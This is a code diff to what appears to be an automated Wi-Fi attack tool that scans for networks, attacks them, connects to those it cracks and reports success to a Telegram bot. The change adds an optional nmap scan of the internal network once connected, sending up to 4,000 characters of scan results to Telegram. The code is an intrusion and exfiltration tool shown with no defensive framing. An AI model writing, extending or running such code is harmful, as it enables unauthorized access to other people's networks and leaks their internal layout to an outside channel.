@@ -9,14 +9,17 @@ from constants import (
     ATTACK_INTERFACE,
     PCAP_FILE,
     STOP_ON_SUCCESS,
-    MAX_RUNTIME
+    MAX_RUNTIME,
+    ENABLE_NMAP_SCAN
 )
 from wifi_scan import scan_targets
 from wifi_attack import attack_target
 from wifi_connect import connect_to_wifi
 from send_to_telegram import send_message
+from nmap_scan import run_nmap_scan, get_wifi_ip
 
 global_start_time = time.time()
+
 
 def has_internet():
     try:
@@ -62,6 +65,15 @@ while targets:
             if has_internet():
                 logging.info("Connection successful. Sending to Telegram...")
                 send_message(msg)
+                if ENABLE_NMAP_SCAN:
+                    ip = get_wifi_ip(ATTACK_INTERFACE)
+                    if ip:
+                        logging.info(f"Running nmap scan on internal network: {ip}")
+                        nmap_result = run_nmap_scan(ip)
+                        if nmap_result:
+                            send_message(f"[nmap scan result]\n```{nmap_result[:4000]}```")
+                    else:
+                        logging.warning("No IP assigned to wlan0. Skipping nmap scan.")
             else:
                 logging.warning("Connected, but no internet. Skipping Telegram message.")
             if STOP_ON_SUCCESS:
